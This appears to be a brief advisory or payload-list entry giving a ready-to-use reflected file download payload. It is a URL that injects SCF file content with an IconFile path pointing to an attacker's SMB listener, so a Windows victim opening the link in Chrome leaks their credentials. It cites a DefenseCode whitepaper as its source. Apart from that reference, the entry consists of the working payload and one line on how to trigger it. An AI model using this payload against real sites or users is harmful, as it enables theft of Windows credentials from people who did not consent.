### Details

Below payload can be used on a website which is vulnerable to reflective file download.

http[s]://vulnerablesite.com/vulnerablelink/filename.scf?prefix=%0A[SHELL]%0AIconFile=\\\\<SMB_LISTENER_IP_ADDRESS>\\<RANDOM_FILE>&format=jsonp

To execute this payload, Victim must visit the link with Google Chrome running on Microsoft Windows to capture the credentials.

### Reference:
https://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf
